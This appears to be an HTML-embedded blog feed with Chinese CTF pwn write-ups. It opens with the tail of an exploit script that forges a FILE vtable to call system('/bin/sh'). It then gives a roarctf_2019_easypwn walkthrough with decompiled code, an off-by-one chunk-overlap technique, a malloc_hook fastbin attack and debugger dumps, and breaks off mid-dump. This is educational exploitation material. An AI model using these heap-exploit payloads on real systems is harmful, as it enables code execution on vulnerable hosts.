class="built_in">hex</span>(main_arena))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">onegadget = <span class="number">0xcafebabedeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fakechunk =b&#x27;\x00&#x27;*0x2b0</span></span><br><span class="line"><span class="string">pad =b&#x27;/bin/sh\x00&#x27;+p64(0x61)</span></span><br><span class="line"><span class="string">pad+= p64(main_arena) +p64(list_all-0x10)+p64(2)+p64(3)</span></span><br><span class="line"><span class="string">pad =pad.ljust(0xc0,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="string">pad +=p64(0xffffffffffffffff)</span></span><br><span class="line"><span class="string">pad = pad.ljust(0xd8,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="string">vtable  = heap_addr+0x10+0x2b0 + 0xd8 + 0x8</span></span><br><span class="line"><span class="string">pad += p64(vtable)</span></span><br><span class="line"><span class="string">fake_vtable = p64(0)*2+p64(1)+p64(system)</span></span><br><span class="line"><span class="string">fakechunk+=pad+fake_vtable</span></span><br><span class="line"><span class="string">edit(0,fakechunk)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">data = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(main_arena)+p64(list_all-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> + <span class="number">0xd8</span> + <span class="number">0x8</span>+<span class="number">0x10</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(system)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line">ch(<span class="number">1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Size of page :&quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>roarctf_2019_easypwn</title>
    <url>/2022/03/21/roarctf-2019-easypwn/</url>
    <content><![CDATA[<h1 id="这次的题比较难搞，但是攻击点挺单一，过程中里到了2个手法"><a href="#这次的题比较难搞，但是攻击点挺单一，过程中里到了2个手法" class="headerlink" title="这次的题比较难搞，但是攻击点挺单一，过程中里到了2个手法"></a>这次的题比较难搞，但是攻击点挺单一，过程中里到了2个手法</h1><h2 id="环境以及保护"><a href="#环境以及保护" class="headerlink" title="环境以及保护"></a>环境以及保护</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/buuoj/roarctf_2019_easy_pwn$ checksec --file=roarctf</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/Desktop/buuoj/roarctf_2019_easy_pwn/roarctf&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>保护全开了，那么我们只能考虑劫持malloc_hook,或者IO_FILE。这里我还是优先考虑了劫持mallochook，使用onegadget。还是因为buuoj不给libc，虽然ubuntu16的docker容器中glibc通常为ubunt11.2或者ubuntu11.3，但是这里还是不行，猜测可能是11.1的版本，这里就不过多的猜测了，泄露版本永远都不是重点和难点。</p>
<h3 id="题目主要代码"><a href="#题目主要代码" class="headerlink" title="题目主要代码"></a>题目主要代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Note system&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. create a note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. write note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. drop the note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. show the note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;choice: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实每次看这个menu的页面，就可以知道重点关注什么地方了。这个题呢，还是毕竟规矩的创建，编辑，输出，删除。考虑几个点有没有溢出，有没有UAF.</p>
<p>很遗憾这个题并没有太多的机会，只有1字节溢出，free后指针清空</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_C46</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;inuse + <span class="number">4</span> * i);</span><br><span class="line">    <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      size = getnum(v2);</span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">          size = <span class="number">0x1000</span>;</span><br><span class="line">        v4 = <span class="built_in">calloc</span>(size, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *((_DWORD *)&amp;inuse + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">        *((_DWORD *)&amp;Size + <span class="number">4</span> * i) = size;</span><br><span class="line">        <span class="built_in">list</span>[<span class="number">2</span> * i] = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;the index of ticket is %d \n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">read_content</span><span class="params">(__int64 a1, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v4; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( size &gt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(<span class="number">0</span>, (<span class="type">void</span> *)(v3 + a1), size - v3);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">      v3 += v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">read_size</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; (<span class="type">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;                   <span class="comment">// off_by_one</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//write_note</span></span><br><span class="line">__int64 <span class="title function_">sub_E82</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  size = getnum(v1);</span><br><span class="line">  idx = size;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt;= <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    size = *((_DWORD *)&amp;inuse + <span class="number">4</span> * size);</span><br><span class="line">    <span class="keyword">if</span> ( size == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      size = getnum(<span class="number">1</span>);</span><br><span class="line">      v4 = read_size(*((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;Size + <span class="number">4</span> * idx), (<span class="type">unsigned</span> <span class="type">int</span>)size);<span class="comment">// 存在1字节溢出</span></span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        size = read_content(<span class="built_in">list</span>[<span class="number">2</span> * idx], v4); <span class="comment">// 不能输入少于size的内容</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//drop note</span></span><br><span class="line">__int64 <span class="title function_">sub_F8E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  idx = getnum(v3);</span><br><span class="line">  v4 = idx;</span><br><span class="line">  v2 = idx;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0LL</span> &amp;&amp; idx &lt;= <span class="number">15LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *((<span class="type">int</span> *)&amp;inuse + <span class="number">4</span> * idx);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;inuse + <span class="number">4</span> * idx) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)&amp;Size + <span class="number">4</span> * idx) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)<span class="built_in">list</span>[<span class="number">2</span> * idx]);</span><br><span class="line">      <span class="built_in">list</span>[<span class="number">2</span> * v2] = <span class="number">0LL</span>;                       <span class="comment">// 不存在uaf</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">output_content</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v4; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( a2 &gt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = write(<span class="number">1</span>, (<span class="type">const</span> <span class="type">void</span> *)(v3 + a1), a2 - v3);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">      v3 += v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v2 = getnum(v1);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *((_DWORD *)&amp;inuse + <span class="number">4</span> * v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      v2 = output_content(<span class="built_in">list</span>[<span class="number">2</span> * v3], *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;Size + <span class="number">4</span> * v3));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码实现的逻辑还算比较哇民政，没有太大的问题。由于题目保护全开了，操作空间就很小。唯一的漏洞还非常明显if ( a2 - a1 &#x3D;&#x3D; 10 )<br>    LODWORD(result) &#x3D; a1 + 1;   其中a1是我们创建时输入的size，a2是我们进行write时输入的size，经典的手法创建时是不进行16字节对齐，卡最大的堆块界限，0x88，write时只要输入的时0x88+10 ，就可以实现1字节的溢出。</p>
<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>因为题目在申请堆块的时候，使用的是calloc，会对返回的堆块进行初始化。所以我们必须构造的时堆块的重叠或者重复使用</p>
<p>这里我们只着重介绍两种手法的实现，就不具体展示利用过程了，因为流程比较固定；</p>
<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x88</span>)			<span class="comment">#泄露</span></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x68</span>+<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x61</span>+p64(<span class="number">0x190</span>)+<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>这个是经典的套路了，利用unsortedbins的双链表绕过unlink的检查，成功的chunk0合并到topchunk，作为新的topchunk,这个时候chunk1仍在使用，但是被包含进了topchnk，那么我们下面如果重复申请add(0x88),add(0x18),就可以在bss的链表中两次利用了，人为的uaf，这里的话呢，我写的0x18比较小，可以写大点，比如0x88，然后重复申请后，有两个地方的指针指向这块区域，释放一个，用另外一个进行泄露（因为0x91的大小又被写进了unsortedbins）这样有了libc的基地址。通过上述流程我们就是实现了人为的uaf。如果我们话存在一个0x70大小的堆块的重复利用，就可以进行fastbinsattack，将malloc_hook-0x23写入fastbins，然后就可以可以申请出来实现malloc_hook的劫持。</p>
<p>这个操作就很经典了，劫持malloc_hook后查看栈的结构，寻找满足要求的onegadegt</p>
<h3 id="瞎操作"><a href="#瞎操作" class="headerlink" title="瞎操作"></a>瞎操作</h3><p>我在第一次进行unlink操作时，因为不仅修改了后面堆块的堆头，还修改了假tophcunk的堆头，同样想利用unsortedbin的双链表绕过检查，但是失败了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xb0&#x27;</span>)</span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x18</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xb0</span>)+<span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>)</span><br></pre></td></tr></table></figure>

<p>但是，却误打误撞的绕过了unsortedbins的检查，如果释放1，然后修改他的size（0x90—&gt;0xb0）,期望能够切割堆块(0x90)，然后剩下的0x20会被加入对应的bins，这里会报错我还没有搞清楚原因，报错的信息大概是prevsize不合法。</p>
<p>然后我的瞎操作就饶过了一系列的检查，虽然没能构造新的topchunk,但是chunk1的紧邻堆块2是我们在使用的，当我们add(0x88)，会对其进行切割，剩下的0x20会进入unsortedbin的双链表，而这剩下的就是我们使用的chunk2，这样chunk的fd,bk指针指向main_arena，这样既可以完成了泄露</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55ad680a80b0</span> —▸ <span class="number">0x7f39d1cdab78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55ad680a80b0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">2</span>gx <span class="number">0x55ad680a80b0</span></span><br><span class="line"><span class="number">0x55ad680a80b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>

<p>然后申请出来</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x55ad67ba8040</span>:	<span class="number">0x0000001800000001</span>	<span class="number">0x000055ad680a8010</span></span><br><span class="line"><span class="number">0x55ad67ba8050</span>:	<span class="number">0x0000008800000001</span>	<span class="number">0x000055ad680a8030</span></span><br><span class="line"><span class="number">0x55ad67ba8060</span>:	<span class="number">0x0000001800000001</span>	<span class="number">0x000055ad680a80c0</span></span><br><span class="line"><span class="number">0x55ad67ba8070</span>:	<span class="number">0x0000001000000001</span>	<span class="number">0x000055ad680a80c0</span></span><br></pre></td></tr></table></figure>

<p>就可以重复利用，我们利用chunk1来修改chunk的size（0x21—-&gt;0x71），这样当chunk2释放后门进入fastbin,利用chunk3修改fd指针，就把malloc_hook链接入fastbins。free chnnk  进入fastbins时，要保证chunk 的下一个chunk合法，但是只会检查size，这里我直接申请一个堆块绕过，后面申请到aimed_chunk 就比较简单了。</p>
<p>最后就是这个onegadegt了，很不幸这里没有合适的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">RAX  <span class="number">0xcafebabedeadbeef</span></span><br><span class="line"> RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x10</span></span><br><span class="line"> RDX  <span class="number">0x11</span></span><br><span class="line"> RDI  <span class="number">0x10</span></span><br><span class="line"> RSI  <span class="number">0x55fafa1d3cd1</span> ◂— mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x0</span></span><br><span class="line"> R10  <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x7f55c10ef6e0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ◂— add    al, byte ptr [rax]</span><br><span class="line"> R12  <span class="number">0x55fafa1d39a0</span> ◂— xor    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7ffc37dd49f0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x10</span></span><br><span class="line"> RSP  <span class="number">0x7ffc37dd48a0</span> ◂— <span class="number">0x7</span></span><br><span class="line"> RIP  <span class="number">0x7f55c0ffd028</span> (<span class="built_in">calloc</span>+<span class="number">680</span>) ◂— call   rax</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7f55c0ffd028</span> &lt;<span class="built_in">calloc</span>+<span class="number">680</span>&gt;    call   rax</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f55c0ffd02a</span> &lt;<span class="built_in">calloc</span>+<span class="number">682</span>&gt;    xor    esi, esi</span><br><span class="line">   <span class="number">0x7f55c0ffd02c</span> &lt;<span class="built_in">calloc</span>+<span class="number">684</span>&gt;    test   rax, rax</span><br><span class="line">   <span class="number">0x7f55c0ffd02f</span> &lt;<span class="built_in">calloc</span>+<span class="number">687</span>&gt;    mov    rdx, rbp</span><br><span class="line">   <span class="number">0x7f55c0ffd032</span> &lt;<span class="built_in">calloc</span>+<span class="number">690</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x7f55c0ffd035</span> &lt;<span class="built_in">calloc</span>+<span class="number">693</span>&gt;    jne    <span class="built_in">calloc</span>+<span class="number">656</span> &lt;<span class="number">0x7f55c0ffd010</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f55c0ffd037</span> &lt;<span class="built_in">calloc</span>+<span class="number">695</span>&gt;    xor    eax, eax</span><br><span class="line">   <span class="number">0x7f55c0ffd039</span> &lt;<span class="built_in">calloc</span>+<span class="number">697</span>&gt;    jmp    <span class="built_in">calloc</span>+<span class="number">312</span> &lt;<span class="number">0x7f55c0ffceb8</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f55c0ffd03e</span> &lt;<span class="built_in">calloc</span>+<span class="number">702</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x7f55c0ffd040</span> &lt;<span class="built_in">calloc</span>+<span class="number">704</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x33ee31</span>]</span><br><span class="line">   <span class="number">0x7f55c0ffd047</span> &lt;<span class="built_in">calloc</span>+<span class="number">711</span>&gt;    mov    dword ptr fs:[rax], <span class="number">0xc</span></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7ffc37dd48a0</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7ffc37dd48a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7ffc37dd48b0</span> —▸ <span class="number">0x7ffc37dd48f0</span> —▸ <span class="number">0x7ffc37dd4910</span> —▸ <span class="number">0x55fafa1d42c0</span> ◂— push   r15</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7ffc37dd48b8</span> —▸ <span class="number">0x55fafa1d39a0</span> ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffc37dd48c0</span> —▸ <span class="number">0x7ffc37dd49f0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7ffc37dd48c8</span> —▸ <span class="number">0x55fafa1d3cd1</span> ◂— mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffc37dd48d0</span> ◂— <span class="number">0x7fa1d39a0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7ffc37dd48d8</span> ◂— <span class="number">0x100000010</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>55c0ffd028 <span class="built_in">calloc</span>+<span class="number">680</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">55f</span>afa1d3cd1</span><br><span class="line">   f <span class="number">2</span>        <span class="number">7f</span>a1d39a0</span><br><span class="line">   f <span class="number">3</span>        <span class="number">100000010</span></span><br><span class="line">   f <span class="number">4</span>        <span class="number">100000006</span></span><br><span class="line">   f <span class="number">5</span>  <span class="number">3b</span>dcd6e58a0f900</span><br><span class="line">   f <span class="number">6</span>     <span class="number">7f</span>fc37dd4910</span><br><span class="line">   f <span class="number">7</span>     <span class="number">55f</span>afa1d4258</span><br><span class="line">   f <span class="number">8</span>        <span class="number">137</span>dd49f0</span><br><span class="line">   f <span class="number">9</span>  <span class="number">3b</span>dcd6e58a0f900</span><br><span class="line">   f <span class="number">10</span>     <span class="number">55f</span>afa1d42c0</span><br><span class="line">Program received signal <span class="title function_">SIGSEGV</span> <span class="params">(fault address <span class="number">0x0</span>)</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; <span class="built_in">stack</span> 40</span><br><span class="line">00:0000│ rsp  0x7ffc37dd48a0 ◂— 0x7</span><br><span class="line">01:0008│      0x7ffc37dd48a8 ◂— 0x0</span><br><span class="line">02:0010│      0x7ffc37dd48b0 —▸ 0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class="line">03:0018│      0x7ffc37dd48b8 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class="line">04:0020│      0x7ffc37dd48c0 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class="line">05:0028│      0x7ffc37dd48c8 —▸ 0x55fafa1d3cd1 ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">06:0030│      0x7ffc37dd48d0 ◂— 0x7fa1d39a0</span><br><span class="line">07:0038│      0x7ffc37dd48d8 ◂— 0x100000010</span><br><span class="line">08:0040│      0x7ffc37dd48e0 ◂— 0x100000006</span><br><span class="line">09:0048│      0x7ffc37dd48e8 ◂— 0x3bdcd6e58a0f900</span><br><span class="line">0a:0050│      0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class="line">0b:0058│      0x7ffc37dd48f8 —▸ 0x55fafa1d4258 ◂— jmp    0x55fafa1d42ad</span><br><span class="line">0c:0060│      0x7ffc37dd4900 ◂— 0x137dd49f0</span><br><span class="line">0d:0068│      0x7ffc37dd4908 ◂— 0x3bdcd6e58a0f900</span><br><span class="line">0e:0070│      0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class="line">0f:0078│      0x7ffc37dd4918 —▸ 0<span class="title function_">x7f55c0f98840</span> <span class="params">(__libc_start_main+<span class="number">240</span>)</span> ◂— mov    edi, eax</span><br><span class="line">10:0080│      0x7ffc37dd4920 —▸ 0x7ffc37dd49f8 —▸ 0x7ffc37dd6080 ◂— 